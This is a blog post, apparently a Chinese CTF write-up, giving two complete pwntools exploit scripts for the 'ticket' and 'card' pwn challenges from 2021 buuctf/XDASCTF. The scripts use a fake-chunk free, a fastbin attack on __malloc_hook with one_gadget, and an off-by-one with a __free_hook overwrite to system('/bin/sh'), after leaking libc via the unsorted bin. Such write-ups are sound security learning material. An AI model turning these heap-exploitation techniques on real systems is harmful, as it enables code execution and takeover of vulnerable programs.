---
title: 2021 buuctfXDASCTF pwn 复现
date: 2022-03-30 22:54:59 +0800
categories:
  - ctf比赛
tags:
  - pwn
  - ctf
permalink: /posts/id=6/
pin: false
published:
---
## ticket

```python
from pwn import *
from LibcSearcher import *
from sys import argv
# context(os='linux',arch='amd64',log_level='debug')

s       = lambda data               :p.send(data)
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(data)
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)

binary = './ticket'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn',27965) if argv[1]=='r' else process(binary)
libc = ELF('/home/ef4tless/glibc-all-in-one/libs/libc-2.23.so',checksec=False)
gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

def dbg():
    gdb.attach(p)
    pause()

def setinfo(name, say, age):
    sa("Your name: \n", name)
    sa("what do you want to say before take off(wu hu qi fei): \n", say)
    sla("Your age: \n", age)


def add(idx, size):
    sla(">> ", '1')
    sla("Index: \n", idx)
    sla("Remarks size: \n", size)


def free(idx):
    sla(">> ", '2')
    sla("Index: \n", idx)

def edit(idx, remark):
    sla(">> ", '3')
    sla("Index: \n", idx)
    sa("Your remarks: \n", remark)

def show(idx):
    sla(">> ", '4')
    sla("Index: \n", idx)

# start
setinfo('a', 'a', 0x6020e0)# fakechunk address
add(1, 0x21)
add(2, 0x100)
add(3, 0x10)
add(5, 0x21)

free(-3)# free fakechunk
add(0, 0x18)
edit(0, p64(0x100) + p64(0))
free(2)# free to unsortbin
add(2, 0x100)
show(2)# leak
leak_libc_addr = uu64()
lg('leak_libc_addr',leak_libc_addr)
libc_base_addr = leak_libc_addr - libc.sym['__malloc_hook'] - 88 -0x10
lg('libc_base_addr',libc_base_addr)

target_addr = libc.sym["__malloc_hook"] - 0x23 + libc_base_addr
realloc_addr = libc.sym['realloc'] + libc_base_addr
one_gadget = libc_base_addr + gadgets[1]

edit(0, p64(0x10000))# change chunk2 size

free(1)# get freechunk 0x70
add(1, 0x60)
free(1)

pl = '\x00'*0x100 + p64(0x110)+p64(0x21)+'\x00'*0x18+p64(0x31)+'\x00'*0x28+p64(0x71)+p64(target_addr)
edit(2, pl)# edit fd

add(1, 0x60)# fastbin attack
add(3, 0x60)
pl2 = 'a'*0xb + p64(one_gadget) + p64(realloc_addr+0xd)
edit(3, pl2)

sla(">> ", "5")
# end
p.interactive()
```
## card

```python
from pwn import *
from LibcSearcher import *
from sys import argv

context(os='linux',arch='amd64',log_level='debug')

s       = lambda data               :p.send(data)
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(data)
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)

binary = './card'
context.binary = binary
elf = ELF(binary)

p = remote('node3.buuoj.cn',26690) if argv[1]=='r' else process(binary)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
libc = ELF('/home/ef4tless/glibc-all-in-one/libs/libc.so',checksec=False)

def dbg():
    gdb.attach(p)
    pause()

def fight(idx, size, data='a'):
    sla("choice:", '1')
    sla("please choice your card:", idx)
    sla("Infuse power:\n", size)
    sa("quickly!", data)

def call(idx, data):
    sla("choice:", '2')
    sla("please choice your card\n", idx)
    sa("start your bomb show\n", data)

def free(idx):
    sla("choice:", "3")
    sla("Which card:", idx)

def show(idx):
    sla("choice:", "4")
    sla("index:", idx)

# start
for i in range(7):
    fight(i, 0x80)

fight(7, 0x80)# 0x90-0x20-0x90
fight(8, 0x18)
fight(9, 0x80)
fight(10, 0x10, "/bin/sh\x00")# topchunk

for i in range(7):
    free(i)

free(7)# offbyone
call(8, 'a'*0x10 + p64(0xb0) + '\x90')
free(8)# freechunk 0x20
free(9)

fight(0, 0xa0, "a" * 8)
show(0)
ru("dedededededede:")
leak_libc_addr = uu64()
lg('leak_libc_addr',leak_libc_addr)
libc_base_addr = leak_libc_addr - 0x130 - 96 -0x10-libc.sym['__malloc_hook']

call(0, "a" * 0x88 + p64(0x21) + p64(libc.sym['__free_hook']+libc_base_addr))
fight(1, 0x10)
fight(2, 0x10, p64(libc.sym['system']+libc_base_addr))

free(10)
# end
p.interactive()
```
总结：都是处理进unsortbin获取libc基地址的题